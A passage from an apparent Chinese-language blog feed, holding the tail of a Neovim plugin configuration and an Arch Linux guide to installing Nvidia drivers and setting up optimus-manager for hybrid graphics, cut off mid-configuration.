&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===配色方案===</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span>c1 :<span class="keyword">set</span> background=dark<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">colorscheme</span> solarized8<span class="symbol">&lt;CR&gt;</span>:AirlineTheme jellybeans<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot;配色1</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span>c2 :<span class="keyword">set</span> background=light<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">let</span> ayucolor=<span class="string">&#x27;light&#x27;</span><span class="symbol">&lt;CR&gt;</span>:<span class="keyword">colorscheme</span> ayu<span class="symbol">&lt;CR&gt;</span>:AirlineTheme ayu_light<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 配色2</span></span><br><span class="line"><span class="keyword">set</span> termguicolors	<span class="comment">&quot;开启真彩支持</span></span><br><span class="line"><span class="keyword">set</span> background=dark</span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:solarized_termtrans</span>=<span class="number">1</span>	<span class="comment">&quot; 透明背景</span></span><br><span class="line"><span class="comment">&quot;colorscheme solarized8</span></span><br><span class="line"><span class="string">&quot;let ayucolor=&#x27;light&#x27;	&quot;</span> light mirage dark</span><br><span class="line"><span class="comment">&quot;colorscheme ayu</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===目录树===</span></span><br><span class="line"><span class="comment">&quot; ==NERDTreeToggle==</span></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;F3&gt;</span> :NERDTreeToggle<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 设置目录树快捷键</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==NERDTree-git提示==</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:NERDTreeIndicatorMapCustom</span> = &#123;</span><br><span class="line">    \ <span class="string">&quot;Modified&quot;</span>  : <span class="string">&quot;✹&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Staged&quot;</span>    : <span class="string">&quot;✚&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Untracked&quot;</span> : <span class="string">&quot;✭&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Renamed&quot;</span>   : <span class="string">&quot;➜&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Unmerged&quot;</span>  : <span class="string">&quot;═&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Deleted&quot;</span>   : <span class="string">&quot;✖&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Dirty&quot;</span>     : <span class="string">&quot;✗&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Clean&quot;</span>     : <span class="string">&quot;✔︎&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Unknown&quot;</span>   : <span class="string">&quot;?&quot;</span></span><br><span class="line">    \ &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==大规模项目文件浏览==</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;C-p&gt;</span> :CtrlP<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ctrlp_prompt_mappings</span> = &#123;</span><br><span class="line">  \ <span class="string">&#x27;PrtSelectMove(&quot;j&quot;)&#x27;</span>:   [<span class="string">&#x27;&lt;c-e&gt;&#x27;</span>, <span class="string">&#x27;&lt;down&gt;&#x27;</span>],</span><br><span class="line">  \ <span class="string">&#x27;PrtSelectMove(&quot;k&quot;)&#x27;</span>:   [<span class="string">&#x27;&lt;c-u&gt;&#x27;</span>, <span class="string">&#x27;&lt;up&gt;&#x27;</span>],</span><br><span class="line">  \ &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===自动化===</span></span><br><span class="line"><span class="comment">&quot; ==coc配置==</span></span><br><span class="line"><span class="comment">&quot; 查看：https://github.com/neoclide/coc.nvim 中Extensions的列表</span></span><br><span class="line"><span class="comment">&quot; 执行命令安装coc对相应语言的补全</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; 若表中没有需要的，可参考 &quot;</span>Register custom <span class="keyword">language</span> servers<span class="comment">&quot; 进行配置</span></span><br><span class="line"><span class="comment">&quot; 参考教程：https://www.jianshu.com/p/231bfb066051</span></span><br><span class="line"><span class="keyword">set</span> timeoutlen=<span class="number">500</span> 		<span class="comment">&quot; 设置按键超时为</span></span><br><span class="line"><span class="keyword">set</span> cmdheight=<span class="number">2</span> 		<span class="comment">&quot; 设置命令行行数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;C-d&gt;</span> <span class="symbol">&lt;Esc&gt;</span>:<span class="keyword">set</span> cmdheight=<span class="number">2</span><span class="symbol">&lt;CR&gt;</span><span class="keyword">a</span></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;C-t&gt;</span> <span class="symbol">&lt;Esc&gt;</span>:<span class="keyword">set</span> cmdheight=<span class="number">10</span><span class="symbol">&lt;CR&gt;</span><span class="keyword">a</span></span><br><span class="line"><span class="keyword">nnoremap</span> <span class="symbol">&lt;C-d&gt;</span> :<span class="keyword">set</span> cmdheight=<span class="number">2</span><span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">nnoremap</span> <span class="symbol">&lt;C-t&gt;</span> :<span class="keyword">set</span> cmdheight=<span class="number">10</span><span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> updatetime=<span class="number">1000</span></span><br><span class="line"><span class="keyword">set</span> shortmess+=<span class="keyword">c</span></span><br><span class="line"><span class="keyword">set</span> signcolumn=yes</span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;silent&gt;</span><span class="symbol">&lt;expr&gt;</span> <span class="symbol">&lt;TAB&gt;</span></span><br><span class="line">      \ <span class="built_in">pumvisible</span>() ? <span class="string">&quot;\&lt;C-n&gt;&quot;</span> :</span><br><span class="line">      \ <span class="symbol">&lt;SID&gt;</span>check_back_space() ? <span class="string">&quot;\&lt;TAB&gt;&quot;</span> :</span><br><span class="line">      \ coc#refresh()</span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;expr&gt;</span><span class="symbol">&lt;S-TAB&gt;</span> <span class="built_in">pumvisible</span>() ? <span class="string">&quot;\&lt;C-p&gt;&quot;</span> : <span class="string">&quot;\&lt;C-h&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>! <span class="title">s</span>:<span class="title">check_back_space</span><span class="params">()</span> <span class="title">abort</span></span></span><br><span class="line">  <span class="keyword">let</span> <span class="keyword">col</span> = <span class="keyword">col</span>(<span class="string">&#x27;.&#x27;</span>) - <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> !col || <span class="built_in">getline</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="keyword">col</span> - <span class="number">1</span>]  =~# <span class="string">&#x27;\s&#x27;</span></span><br><span class="line"><span class="keyword">endfunction</span></span><br><span class="line"><span class="comment">&quot; 使用&lt;cr&gt;确认完成，`&lt;C-g&gt; u`表示在当前位置断开撤销链</span></span><br><span class="line"><span class="comment">&quot; Coc仅在确认时执行片段和其他编辑</span></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;expr&gt;</span> <span class="symbol">&lt;cr&gt;</span> <span class="built_in">pumvisible</span>() ? <span class="string">&quot;\&lt;C-y&gt;&quot;</span> : <span class="string">&quot;\&lt;C-g&gt;u\&lt;CR&gt;&quot;</span></span><br><span class="line"><span class="comment">&quot; 使用K在预览窗口中显示文档</span></span><br><span class="line"><span class="keyword">nnoremap</span> ? :<span class="keyword">call</span> <span class="symbol">&lt;SID&gt;</span>show_documentation()<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>! <span class="title">s</span>:<span class="title">show_documentation</span><span class="params">()</span></span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">index</span>([<span class="string">&#x27;vim&#x27;</span>,<span class="string">&#x27;help&#x27;</span>], &amp;<span class="keyword">filetype</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">execute</span> <span class="string">&#x27;h &#x27;</span>.<span class="built_in">expand</span>(<span class="string">&#x27;&lt;cword&gt;&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">call</span> CocAction(<span class="string">&#x27;doHover&#x27;</span>)</span><br><span class="line">  <span class="keyword">endif</span></span><br><span class="line"><span class="keyword">endfunction</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 突出显示CursorHold上光标下的符号</span></span><br><span class="line"><span class="keyword">autocmd</span> CursorHold * <span class="keyword">silent</span> <span class="keyword">call</span> CocActionAsync(<span class="string">&#x27;highlight&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===历史===</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:undotree_DiffAutoOpen</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">l</span> :UndotreeToggle<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===文本===</span></span><br><span class="line"><span class="comment">&quot; ==过滤对齐工具==</span></span><br><span class="line"><span class="comment">&quot;使用 :Tabularize /|	使文本向 | 对齐,可是其他符号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==快速选中==</span></span><br><span class="line"><span class="string">&quot;视图模式下，使用 i&#x27; 快速选中 &#x27;&#x27; 中的内容，其他: i&quot;</span> i) i] i&#125; ip</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==快速注释==</span></span><br><span class="line"><span class="comment">&quot;输入 &lt;space&gt;cc 对该行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===vim-go===</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_def_mapping_enabled</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_template_autocreate</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_textobj_enabled</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_auto_type_info</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_def_mapping_enabled</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_array_whitespace_error</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_build_constraints</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_chan_whitespace_error</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_extra_types</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_fields</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_format_strings</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_function_calls</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_function_parameters</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_functions</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_generate_tags</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_methods</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_operators</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_space_tab_error</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_string_spellcheck</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_structs</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_trailing_whitespace_error</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_types</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_variable_assignments</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:go_highlight_variable_declarations</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===vim-markdown-toc===</span></span><br><span class="line"><span class="comment">&quot;let g:vmt_auto_update_on_save = 0</span></span><br><span class="line"><span class="comment">&quot;let g:vmt_dont_insert_fence = 1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:vmt_cycle_list_item_markers</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:vmt_fence_text</span> = <span class="string">&#x27;TOC&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:vmt_fence_closing_text</span> = <span class="string">&#x27;/TOC&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===Bullets.vim===</span></span><br><span class="line"><span class="comment">&quot;let g:bullets_set_mappings = 0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:bullets_enabled_file_types</span> = [</span><br><span class="line">			\ <span class="string">&#x27;markdown&#x27;</span>,</span><br><span class="line">			\ <span class="string">&#x27;text&#x27;</span>,</span><br><span class="line">			\ <span class="string">&#x27;gitcommit&#x27;</span>,</span><br><span class="line">			\ <span class="string">&#x27;scratch&#x27;</span></span><br><span class="line">			\]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===Markdon===</span></span><br><span class="line"><span class="comment">&quot; ==MarkdownPreview配置==</span></span><br><span class="line"><span class="comment">&quot; 设置为1，nvim将在进入降价缓冲区后打开预览窗口,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_auto_start</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，当从降价缓冲区转换到另一个缓冲区时，nvim将自动关闭当前预览窗口,默认1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_auto_close</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1时，vim将在保存缓冲区时刷新markdown或从插入模式退出，默认0为自动刷新markdown，因为您编辑或移动光标,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_refresh_slow</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，MarkdownPreview命令可用于所有文件，默认情况下可用于markdown文件,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_command_for_global</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，默认情况下预览服务器可供网络中的其他人使用，服务器侦听localhost（127.0.0.1,默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_open_to_the_world</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 当您在远程vim中工作并在本地浏览器上预览时，使用自定义IP打开预览页面非常有用。详细信息请参阅:https://github.com/iamcco/markdown-preview.nvim/pull/9,默认空</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_open_ip</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 指定浏览器打开预览页面，默认：&#x27;&#x27;,firefox浏览器快熟关闭窗口需要设置：</span></span><br><span class="line"><span class="comment">&quot; about:config &gt; dom.allow_scripts_to_close_windows 将值设置为 true</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_browser</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 设置为1，打开预览页面时，在命令行中回显预览页面url，默认0</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_echo_preview_url</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 自定义vim函数名称打开预览页面此函数将接收url作为param，默认空</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_browserfunc</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; markdown渲染选项</span></span><br><span class="line"><span class="comment">&quot; mkit: markdown-it选项</span></span><br><span class="line"><span class="comment">&quot; katex: katex选项</span></span><br><span class="line"><span class="comment">&quot; uml: markdown-it-plantuml选项</span></span><br><span class="line"><span class="comment">&quot; maid: mermaid选项</span></span><br><span class="line"><span class="comment">&quot; disable_sync_scroll: 禁用同步滚动，默认0</span></span><br><span class="line"><span class="comment">&quot; sync_scroll_type: &#x27;middle&#x27;, &#x27;top&#x27; or &#x27;relative&#x27;, default value is &#x27;middle&#x27;</span></span><br><span class="line"><span class="comment">&quot;   middle: 表示光标位置总是显示在预览页面的中间</span></span><br><span class="line"><span class="comment">&quot;   top: 表示预览页面顶部的vim顶部视口总是显示</span></span><br><span class="line"><span class="comment">&quot;   relative: 表示光标位置总是显示在预览页面的相对位置</span></span><br><span class="line"><span class="comment">&quot; hide_yaml_meta: 隐藏yaml元数据，默认1</span></span><br><span class="line"><span class="comment">&quot; sequence_diagrams: js-sequence-diagrams 选项</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_preview_options</span> = &#123;</span><br><span class="line">    \ <span class="string">&#x27;mkit&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;katex&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;uml&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;maid&#x27;</span>: &#123;&#125;,</span><br><span class="line">    \ <span class="string">&#x27;disable_sync_scroll&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    \ <span class="string">&#x27;sync_scroll_type&#x27;</span>: <span class="string">&#x27;middle&#x27;</span>,</span><br><span class="line">    \ <span class="string">&#x27;hide_yaml_meta&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    \ <span class="string">&#x27;sequence_diagrams&#x27;</span>: &#123;&#125;</span><br><span class="line">    \ &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 使用自定义markdown样式必须是绝对路径</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_markdown_css</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 使用自定义高亮样式必须绝对路径</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_highlight_css</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 使用自定义端口启动服务器或使用随机空白</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_port</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 预览页面标题，$ &#123;name&#125;将替换为文件名</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:mkdp_page_title</span> = <span class="string">&#x27;「$&#123;name&#125;」&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;F8&gt;</span> <span class="symbol">&lt;Plug&gt;</span>MarkdownPreview</span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;F9&gt;</span> <span class="symbol">&lt;Plug&gt;</span>MarkdownPreviewStop</span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;LEADER&gt;</span>mt <span class="symbol">&lt;Plug&gt;</span>MarkdownPreviewToggle</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==表格制作工具==</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">tm</span> :TableModeToggle<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===fzf-gitignore===</span></span><br><span class="line"><span class="keyword">noremap</span> <span class="symbol">&lt;LEADER&gt;</span>gi :FzfGitignore<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===其他===</span></span><br><span class="line"><span class="comment">&quot; ==中文帮组==</span></span><br><span class="line"><span class="string">&quot;set helplang=cn		&quot;</span> 启用英文的为<span class="keyword">en</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==显示按键绑定==</span></span><br><span class="line"><span class="comment">&quot;nnoremap &lt;silent&gt; &lt;leader&gt; :WhichKey &#x27;&lt;Space&gt;&#x27;&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===END===</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;插件配置</span></span><br><span class="line"><span class="comment">&quot; ===</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>NeoVim</tag>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>Nvidia独显驱动安装</title>
    <url>/posts/4aa02744/</url>
    <content><![CDATA[<h1 id="驱动选择"><a href="#驱动选择" class="headerlink" title="驱动选择"></a>驱动选择</h1><p><strong>查看系统内核版本</strong> ： <code>uname -r</code></p>
<p><strong>查看显卡情况</strong> : <code>lspci -k | grep -A 2 -E &quot;(VGA|3D)&quot;</code></p>
<p><strong>根据显卡型号选择驱动版本</strong> :</p>
<ul>
<li>查找代号(如 NV50, NVC0等）： <a href="https://nouveau.freedesktop.org/wiki/CodeNames/">英伟达代号查询页</a></li>
<li>若上面的页面找不到显卡的型号，可到<a href="http://www.nvidia.com/object/IO_32667.html">英伟达历史型号列表页</a>查找</li>
<li><a href="http://www.nvidia.com/Download/index.aspx">英伟达驱动下载站</a>查找</li>
</ul>
<a id="more"></a>
<p>如:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lspci -k | grep -A 2 -E <span class="string">&quot;(VGA|3D)&quot;</span></span><br><span class="line"></span><br><span class="line">00:02.0 VGA compatible controller: Intel Corporation HD Graphics 620 (rev 02)</span><br><span class="line">	Subsystem: Acer Incorporated [ALI] Device 1133</span><br><span class="line">	Kernel driver <span class="keyword">in</span> use: i915</span><br><span class="line">--</span><br><span class="line">01:00.0 3D controller: NVIDIA Corporation GM108M [GeForce 940MX] (rev a2)</span><br><span class="line">	Subsystem: Acer Incorporated [ALI] Device 1133</span><br><span class="line">	Kernel modules: nouveau, nvidia_drm, nvidia</span><br></pre></td></tr></table></figure>
<p>搜索<code>GM108</code><br><figure class="highlight sh"><figcaption><span>https://nouveau.freedesktop.org/wiki/CodeNames/</span></figcaption><table><tr><td class="code"><pre><span class="line">NV110 family (Maxwell)</span><br><span class="line">...</span><br><span class="line">NV118 (GM108)	GeForce 830M, 840M, 930M, 940M[X]</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p><strong>根据相应的型号安装相应驱动</strong> :</p>
<ul>
<li>对于<code>GeForce 630-900</code>、<code>10-20</code>和<code>Quadro / Tesla / Tegra K</code>系列卡以及较新的（<code>NVE0</code>，<code>NV110</code>和较新的2010年及以后的卡），安装 <code>nvidia</code> 或 <code>nvidia-lts</code>（用于 <code>linux-lts</code> 内核）</li>
<li>对于2010-2011年左右的<code>GeForce 400/500/600</code>系列卡（ <code>NVCx</code> 和 <code>NVDx</code> ），安装 <code>nvidia-390xx-dkms</code> (AUR) </li>
<li>更老的显卡推荐直接用开源驱动 <code>nouveau</code> ，或参考<a href="https://wiki.archlinux.org/index.php/NVIDIA#Unsupported_drivers">Arch wiki</a></li>
</ul>
<p>在64位的操作系统上，需要32位程序发挥驱动的优势，可从<code>multilib</code> 源中安装 nvidia 相应的lib32包（如<code>lib32-nvidia-utils</code>）</p>
<h1 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo pacman -S nvidia lib32-nvidia-utils</span><br></pre></td></tr></table></figure>
<p><strong>重启</strong>, nvidia 包含一个将 nouveau 模块列入黑名单的文件，因此必须重新启动</p>
<h1 id="使用optimus-manager实现双显卡切换"><a href="#使用optimus-manager实现双显卡切换" class="headerlink" title="使用optimus-manager实现双显卡切换"></a>使用optimus-manager实现双显卡切换</h1><p>安装 <code>optimus-manager</code> : <code>sudo pacman -S optimus-manager</code></p>
<p><a href="https://github.com/Askannz/optimus-manager">optimus-manager仓库</a></p>
<h2 id="配置optimus-manager"><a href="#配置optimus-manager" class="headerlink" title="配置optimus-manager"></a>配置optimus-manager</h2><p>确保 <code>/etc/X11/xorg.conf</code> 和 <code>/etc/X11/xorg.conf.d</code> 下没有其他显卡和显示相关的配置，如果有的话可备份后删除,原因是 <code>optimus-manager</code> 会生成显卡配置文件 <code>/etc/X11/xorg.conf.d/10-optimus-manager.conf</code>,多个显卡配置文件可能导致出错,更多参考<a href="https://github.com/Askannz/optimus-manager/blob/master/README.md">optimus-manager说明文件</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tree /etc/X11</span><br><span class="line"></span><br><span class="line">/etc/X11/</span><br><span class="line">├── xinit</span><br><span class="line">│   └── xinitrc.d</span><br><span class="line">│       ├── 40-libcanberra-gtk-module.sh</span><br><span class="line">│       └── 50-systemd-user.sh</span><br><span class="line">└── xorg.conf.d</span><br><span class="line">        └── 10-optimus-manager.conf</span><br></pre></td></tr></table></figure>
<p><strong>启动optimus-manager服务</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> optimus-manager</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
<p><strong>配置文件详解</strong></p>
<figure class="highlight sh"><figcaption><span>/etc/optimus-manager/optimus-manager.conf</span></figcaption><table><tr><td class="code"><pre><span class="line">[optimus]</span><br><span class="line"></span><br><span class="line">switching=nouveau</span><br><span class="line"><span class="comment"># 定义了用于接通Nvidia卡电源的方法。</span></span><br><span class="line"><span class="comment"># 可选值：</span></span><br><span class="line"><span class="comment"># -nouveau：将nuveau模块加载到Nvidia卡上。</span></span><br><span class="line"><span class="comment"># -bbswitch：使用bbswitch模块关闭卡的电源（需要bbswitch依赖项）。</span></span><br><span class="line"><span class="comment"># -acpi_call：尝试各种ACPI方法调用以打开和关闭卡的电源（需要acpi_call依赖项）</span></span><br><span class="line"><span class="comment"># -custom：使用自定义脚本 /etc/optimus-manager/nvidia-enable.sh 和/etc/optimus-manager/nvidia-disable.sh 切换</span></span><br><span class="line"><span class="comment"># -none：请勿将外部模块用于电源管理。对于某些笔记本电脑型号，最好是将此选项与pci_power_control结合使用。</span></span><br><span class="line"><span class="comment"># 具体选择参考: https://github.com/Askannz/optimus-manager/wiki/A-guide--to-power-management-options</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pci_power_control=no</span><br><span class="line"><span class="comment"># 在Intel模式下启用PCI电源管理。</span></span><br><span class="line"><span class="comment"># 此选项与acpi_call和bbswitch不兼容，因此会被忽略。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pci_remove=no</span><br><span class="line"><span class="comment"># 从PCI总线上卸下Nvidia卡。可以防止通电导致的崩溃。</span></span><br><span class="line"><span class="comment"># 当switching 为 nouveau 和 bbswitch 将被忽略。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pci_reset=no</span><br><span class="line"><span class="comment"># 在重载nvidia模块之前，在PCI级别上重置Nvidia卡。</span></span><br><span class="line"><span class="comment"># 在重载nvidia模块之前，确保卡处于新状态。</span></span><br><span class="line"><span class="comment"># 可解决一些切换问题。</span></span><br><span class="line"><span class="comment"># 可选值：</span></span><br><span class="line"><span class="comment"># -no：不执行任何重置</span></span><br><span class="line"><span class="comment"># -function_level：执行轻度的“功能级别”重置</span></span><br><span class="line"><span class="comment"># -hot_reset：对PCI桥接器执行“热重置”。注意：此方法直接与硬件混淆，在使用前请阅读optimus-manager的在线文档，即使pci_remove=no，它也会执行PCI移除操作。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto_logout=yes</span><br><span class="line"><span class="comment"># 切换GPU时自动注销当前的桌面会话。</span></span><br><span class="line"><span class="comment"># 以下DE/WM 支持此功能：KDE Plasma，GNOME，XFCE，LXDE，Deepin，i3，Openbox，AwesomeWM，bspwm</span></span><br><span class="line"><span class="comment"># 如果禁用此选项，或者使用其他桌面环境，GPU切换仅在下一次图形界面登录时生效。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">startup_mode=intel</span><br><span class="line"><span class="comment"># 在启动时启用的GPU模式。可选值：nvidia，intel，hybrid，auto</span></span><br><span class="line"><span class="comment"># auto 是一种特殊模式，可以自动检测计算机是否依靠电池运行,并选择适当的GPU模式。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">startup_auto_battery_mode=intel</span><br><span class="line"><span class="comment"># 用于在 startup_mode=auto 且依靠电池运行时选择GPU模式。</span></span><br><span class="line"><span class="comment"># 可选值：nvidia，intel，hybrid</span></span><br><span class="line"></span><br><span class="line">startup_auto_extpower_mode=nvidia</span><br><span class="line"><span class="comment"># 用于在 startup_mode=auto 且使用外部电源运行时选择GPU模式。</span></span><br><span class="line"><span class="comment"># 